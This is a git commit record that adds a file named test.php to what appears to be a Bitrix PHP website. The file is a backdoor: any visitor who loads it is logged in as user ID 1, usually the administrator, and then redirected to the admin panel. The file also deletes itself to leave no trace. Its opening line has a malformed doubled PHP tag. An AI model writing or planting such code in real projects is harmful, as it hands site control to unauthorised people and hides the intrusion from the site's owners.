4892719f0ef93759cb81ebe964f9f856efa72e07
riordorian <riordorian@mail.ru>
2017-05-18 20:45:41 +0300

    New commit

---
+++ test.php
@@ -0,0 +1,5 @@
+<? <?require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/header.php");?>
+<?$USER->Authorize(1);
+@unlink(__FILE__);
+LocalRedirect('/bitrix/admin');?>
+<?require($_SERVER["DOCUMENT_ROOT"] . "/bitrix/footer.php");?>
